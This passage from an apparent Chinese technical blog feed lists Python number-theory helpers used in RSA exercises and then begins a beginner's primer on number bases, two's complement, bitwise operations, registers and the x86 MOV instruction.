class="fas fa-link"></i></a>2.6.2 libnum.modular.invmod(e,m)</h4>      <p>返回e模m的逆元。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.modular.invmod(<span class="number">5</span>,<span class="number">24</span>))</span><br><span class="line"></span><br><span class="line">result: <span class="number">5</span></span><br></pre></td></tr></table></div></figure><p><strong>其他查看：</strong><span class="exturl"><a class="exturl__link" href="https://github.com/hellman/libnum">https://github.com/hellman/libnum</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="3-Crypto-Util-number-库">          <a href="#3-Crypto-Util-number-库" class="heading-link"><i class="fas fa-link"></i></a>3. Crypto.Util.number 库</h2>              <h3 id="3-1-long-to-bytes">          <a href="#3-1-long-to-bytes" class="heading-link"><i class="fas fa-link"></i></a>3.1 long_to_bytes()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">long_to_bytes(0x41424344)</span><br><span class="line"></span><br><span class="line"># 整数转字节</span><br></pre></td></tr></table></div></figure>        <h3 id="3-2-bytes-to-long">          <a href="#3-2-bytes-to-long" class="heading-link"><i class="fas fa-link"></i></a>3.2 bytes_to_long()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes_to_long(b&#39;hello&#39;)</span><br><span class="line"></span><br><span class="line"># 字节转整数</span><br></pre></td></tr></table></div></figure>        <h3 id="3-3-GCD">          <a href="#3-3-GCD" class="heading-link"><i class="fas fa-link"></i></a>3.3 GCD</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GCD(a,b)</span><br><span class="line"></span><br><span class="line"># a和b最大公约数</span><br></pre></td></tr></table></div></figure>        <h3 id="3-4-inverse">          <a href="#3-4-inverse" class="heading-link"><i class="fas fa-link"></i></a>3.4 inverse()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inverse(10,5)</span><br><span class="line"></span><br><span class="line"># 求逆元</span><br></pre></td></tr></table></div></figure>        <h3 id="3-5-getRandomRange">          <a href="#3-5-getRandomRange" class="heading-link"><i class="fas fa-link"></i></a>3.5 getRandomRange()</h3>              <h3 id="3-6-isPrime">          <a href="#3-6-isPrime" class="heading-link"><i class="fas fa-link"></i></a>3.6 isPrime()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isPrime(1227)</span><br><span class="line"></span><br><span class="line"># 判断是不是素数</span><br></pre></td></tr></table></div></figure>        <h3 id="3-7-size">          <a href="#3-7-size" class="heading-link"><i class="fas fa-link"></i></a>3.7 size()</h3>              <h3 id="3-8-getStrongPrime">          <a href="#3-8-getStrongPrime" class="heading-link"><i class="fas fa-link"></i></a>3.8 getStrongPrime()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getStrongPrime(512)</span><br><span class="line"></span><br><span class="line"># 返回强素数</span><br></pre></td></tr></table></div></figure>        <h3 id="3-9-ceil-div">          <a href="#3-9-ceil-div" class="heading-link"><i class="fas fa-link"></i></a>3.9 ceil_div()</h3>              <h3 id="3-10-ceil-shift">          <a href="#3-10-ceil-shift" class="heading-link"><i class="fas fa-link"></i></a>3.10 ceil_shift()</h3>              <h3 id="3-11-floor-div">          <a href="#3-11-floor-div" class="heading-link"><i class="fas fa-link"></i></a>3.11 floor_div()</h3>              <h3 id="3-12-exact-div">          <a href="#3-12-exact-div" class="heading-link"><i class="fas fa-link"></i></a>3.12 exact_div()</h3>              <h3 id="3-13-exact-log2">          <a href="#3-13-exact-log2" class="heading-link"><i class="fas fa-link"></i></a>3.13 exact_log2()</h3>              <h3 id="3-14-getPrime">          <a href="#3-14-getPrime" class="heading-link"><i class="fas fa-link"></i></a>3.14 getPrime()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getPrime(16)</span><br><span class="line"></span><br><span class="line"># 返回一个最大为 N bit 的随机素数</span><br></pre></td></tr></table></div></figure><p><span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/pcheng/p/9629621.html">https://www.cnblogs.com/pcheng/p/9629621.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/qq_42876636/article/details/87559366">https://blog.csdn.net/qq_42876636/article/details/87559366</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://www.jianshu.com/p/685cfeffe703">https://www.jianshu.com/p/685cfeffe703</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/a745233700/article/details/102341542?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">https://blog.csdn.net/a745233700/article/details/102341542?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>套路：<span class="exturl"><a class="exturl__link" href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/index.html">https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/index.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://www.anquanke.com/post/id/84632">https://www.anquanke.com/post/id/84632</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>题型总结：<span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/vhkjhwbs/article/details/101160822">https://blog.csdn.net/vhkjhwbs/article/details/101160822</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>欧几里得：<span class="exturl"><a class="exturl__link" href="https://www.sohu.com/a/243246344_472906">https://www.sohu.com/a/243246344_472906</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>典型RSA题解：<span class="exturl"><a class="exturl__link" href="https://beiyuouo.github.io/blog/ctf-buuctf/">https://beiyuouo.github.io/blog/ctf-buuctf/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Crypto密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向基础概要</title>
      <link href="2020/07/31/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A6%81/"/>
      <url>2020/07/31/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="一，机器语言">          <a href="#一，机器语言" class="heading-link"><i class="fas fa-link"></i></a>一，机器语言</h2>      <p>加：0100 0000<br>减：0100 1000<br>乘：1111 0111 1110 0000<br>除：1111 0111 1111 0000</p>        <h2 id="二，汇编语言">          <a href="#二，汇编语言" class="heading-link"><i class="fas fa-link"></i></a>二，汇编语言</h2>      <a id="more"></a><p>编译器作用：把汇编语言转为机器语言</p><p><img src="https://img-blog.csdnimg.cn/20200503222526576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="三，C语言">          <a href="#三，C语言" class="heading-link"><i class="fas fa-link"></i></a>三，C语言</h2>      <p><img src="https://img-blog.csdnimg.cn/20200503222601780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="四，C语言和C-的关系">          <a href="#四，C语言和C-的关系" class="heading-link"><i class="fas fa-link"></i></a>四，C语言和C++的关系</h2>      <ol><li>C与C++没有本质区别，只是编译器能做的事情越来越多，功能越来越强大了。</li><li>C是学好C++的基础</li></ol>        <h2 id="五，为什么要学会汇编">          <a href="#五，为什么要学会汇编" class="heading-link"><i class="fas fa-link"></i></a>五，为什么要学会汇编</h2>      <p><img src="https://img-blog.csdnimg.cn/20200503223357845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="六，学习环境">          <a href="#六，学习环境" class="heading-link"><i class="fas fa-link"></i></a>六，学习环境</h2>      <ol><li>VC6</li><li>VS2010 VS2013 VS2016</li></ol><p>选VC6的原因<br>越是新版的添加的代码越多，不利于学习</p>        <h1 id="进制">          <a href="#进制" class="heading-link"><i class="fas fa-link"></i></a>进制</h1>              <h2 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h2>      <p>要想学好进制，首先忘记熟悉的十进制，和进制间的转换</p>        <h2 id="进制的定义">          <a href="#进制的定义" class="heading-link"><i class="fas fa-link"></i></a>进制的定义</h2>      <ol><li>八进制的定义：八个符号组成，0，1，2，3，4，5，6，7，逢八进一</li><li>十进制的定义：十个符号组成，0，1，2，3，4，5，6，7，8，9，逢十进一</li><li>N进制的定义：N个符号组成，逢N进一</li></ol><p>个人进制定义：关键是在逢N进一，符号是自己定义的</p><p>注意：进位是向左边进一位，左面是高位</p>        <h2 id="进制的书写">          <a href="#进制的书写" class="heading-link"><i class="fas fa-link"></i></a>进制的书写</h2>      <p>比如说：七进制</p><p><img src="https://img-blog.csdnimg.cn/20200503225425814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>注意</strong></p><p><strong>个人进制定义：关键是在逢N进一，符号是自己定义的</strong></p><p>例如：1+1=3是否正确<br>答案可以是正确的，如果对于自定义进制的话</p><p><strong>意义：</strong><br>将这种进制方式用于进制加密，可以给解密者很大的困扰</p>        <h2 id="进制运算">          <a href="#进制运算" class="heading-link"><i class="fas fa-link"></i></a>进制运算</h2>      <p>例如：八进制的运算</p><p><img src="https://img-blog.csdnimg.cn/20200503230309345.png" alt="img"></p><p>可以先把加法表和乘法表画出来</p><p><img src="https://img-blog.csdnimg.cn/2020050323171883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200503231749187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200503231920436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="计算机为什么用二进制">          <a href="#计算机为什么用二进制" class="heading-link"><i class="fas fa-link"></i></a>计算机为什么用二进制</h2>      <p>计算机时用电的，电路只有两种状态：1 真（通电）0假（断电）<br>计算机中 存储的任何文件，接受的任何指令都是0和1组成的</p><p>题外：量子计算机：量子还有非真非假的状态，计算量大大提升</p>        <h2 id="二进制的简写形式">          <a href="#二进制的简写形式" class="heading-link"><i class="fas fa-link"></i></a>二进制的简写形式</h2>      <p>十六进制在计算机中可以看作二进制的简写形式</p><p><img src="https://img-blog.csdnimg.cn/2020050323331535.png" alt="img"></p>        <h2 id="数据宽度">          <a href="#数据宽度" class="heading-link"><i class="fas fa-link"></i></a>数据宽度</h2>      <p>在计算机中由于受硬件的限制，数据是有一定长度限制的（称为数据宽度），超过最多宽度的数据会被丢弃。<br><strong>1. 常见的数据宽度</strong></p><p><img src="https://img-blog.csdnimg.cn/2020050323494873.png" alt="img"></p><p>位：里面只能存放一个值（0或1），计算机中最小存储单位<br>字节：一个字节有8个位<br>字：有16位<br>双子：可以存储32位<br><strong>2. 存储范围</strong></p><p><img src="https://img-blog.csdnimg.cn/20200503235434433.png" alt="img"></p><p><strong>例如：</strong><br>char ：计算机就知道要用容器是8位（1个字节）<br>int：计算机就知道你要用的容器是32位的（双字）</p>        <h2 id="有无符号数">          <a href="#有无符号数" class="heading-link"><i class="fas fa-link"></i></a>有无符号数</h2>      <p>不同的编码不同的规则</p><p><strong>1. 无符号数的编码规则</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504000821314.png" alt="img"></p><p>无符号数：这个数是多少就存多少<br>文件不同，解析方式也不同</p><p><strong>2. 有符号数 正数编码规则</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504221043966.png" alt="img"></p><p>原码：最高位（最左面）为符号位，其余各位为数值本身绝对值<br>反码：<br>           正数：反码与原码相同<br>           负数：符号位为1，其余位对原码取反<br>补码：<br>           正数：补码与原码相同<br>           负数：符号位为1，其余位对原码取反加1（1是值）<br> 正0和负0的补码相同<br> 正数和负数的相加实质是：把正数和负数的补码相加，然后再补码，同位相加都为1的话进位。</p><p><strong>3. 举例说明</strong><br>正数编码：</p><p><img src="https://img-blog.csdnimg.cn/2020050422390610.png" alt="img"></p><p>负数编码：<br>符号为1</p><p><img src="https://img-blog.csdnimg.cn/20200504225025458.png" alt="img"></p><p><strong>4. 假设数据宽度为1，Byte(8 bit)</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504231636638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><ol start="5"><li>假设数据宽度为 Doubleworld(32 bit)</li></ol><p><img src="https://img-blog.csdnimg.cn/20200504231915497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="位运算">          <a href="#位运算" class="heading-link"><i class="fas fa-link"></i></a>位运算</h2>      <p><strong>前言：</strong><br>计算机只认识和，计算机所做的运算归根结底是直接对0和1做运算，通常称：位运算。</p><p><strong>为什么要学位运算：</strong><br>1）必须要位运算来实现，比如说：调试器，判断CPU各种状态位<br>2）试题：比如2*8效率最高的实现方式</p><p><strong>1. 与运算</strong><br>两个数都为1结果才为1<br>比如：</p><p><img src="https://img-blog.csdnimg.cn/20200504233141611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>2. 或运算</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504235137956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>3. 异或运算</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504235337567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>4. 非运算</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504235635911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>5. 移位运算</strong><br>左移</p><p><img src="https://img-blog.csdnimg.cn/20200504235911392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>右移</p><p><img src="https://img-blog.csdnimg.cn/20200505000319281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>而对于C语言来说，高位补零还是1看前面定义：比如说unsigned 意为无符号，没有定义unsigned默认就是有符号的，最高位就为符号位。</p><p><strong>6. 总结</strong><br>计算机的所有运算归根结底都会转换为位运算，计算机只会做位运算</p><p><strong>7. 通过位运算实现四则运算</strong><br>举例：加法</p><p><img src="https://img-blog.csdnimg.cn/20200508234137486.png" alt="img"></p><p>运算过程：</p><p><img src="https://img-blog.csdnimg.cn/20200508234825302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>减法：</p><p><img src="https://img-blog.csdnimg.cn/20200508235646720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h1 id="汇编以及环境搭建">          <a href="#汇编以及环境搭建" class="heading-link"><i class="fas fa-link"></i></a>汇编以及环境搭建</h1>      <p><strong>1. 学习汇编不是为了写代码</strong></p><p><img src="https://img-blog.csdnimg.cn/20200509000103780.png" alt="img"></p><p><strong>2. 环境准备</strong></p><p>Dbg  32位和64位</p><p><img src="https://img-blog.csdnimg.cn/20200509102203300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="寄存器">          <a href="#寄存器" class="heading-link"><i class="fas fa-link"></i></a>寄存器</h2>      <p>寄存器就是CPU中用来存储数据的地方</p><p><img src="https://img-blog.csdnimg.cn/20200509104210495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>64位的CPU是从32位的拓展来的，整体结构没有发生改变，只是在原来的基础上增加了寄存器，汇编指令都是一样的</p><p><img src="https://img-blog.csdnimg.cn/20200509104922187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="使用32位的寄存器">          <a href="#使用32位的寄存器" class="heading-link"><i class="fas fa-link"></i></a>使用32位的寄存器</h2>      <p><strong>1. 前言</strong><br>mov指令是用来移动数据的，汇编的实质就是：寄存器与寄存器，或者寄存器与内存之间数据的来回流动</p><p><strong>2. MOV指令</strong></p><ol><li><p>立即数存到寄存器里</p><p><img src="https://img-blog.csdnimg.cn/20200509112159154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li><li><p>寄存器数存到寄存器里</p><p><img src="https://img-blog.csdnimg.cn/20200509112406781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li></ol><p><img src="https://img-blog.csdnimg.cn/2020050911253544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>通用寄存器</strong></p><p>不同位的MOV命令</p><p><img src="https://img-blog.csdnimg.cn/2020050914085727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>不同位的寄存器，实际上32位的寄存器相当于4个字节的，选用16位的或者8位的，就相当于用了其中2个或者1个<br>例如：将eax存储-1，然后进行反汇编，用16位的mov命令</p><p><img src="https://img-blog.csdnimg.cn/20200509140506816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200509140649655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>对于8位</p><p><img src="https://img-blog.csdnimg.cn/20200509191232664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>H是高8位，L是低8位<br><strong>补充</strong><br>不同寄存器到寄存器的存储要相同位数。</p>        <h1 id="内存地址和MOV指令">          <a href="#内存地址和MOV指令" class="heading-link"><i class="fas fa-link"></i></a>内存地址和MOV指令</h1>      <p><img src="https://img-blog.csdnimg.cn/20200509194900747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="内存地址">          <a href="#内存地址" class="heading-link"><i class="fas fa-link"></i></a>内存地址</h2>      <ol><li><p>内存太大没法起名字，只能用编号，当我们想向内存中存储数据时，或者从内存中读取数据时，必须用到这个编号，就像写信要写地址收件人一样。</p></li><li><p>这个编号又称内存地址（32位，前面0可以省略）</p><p><img 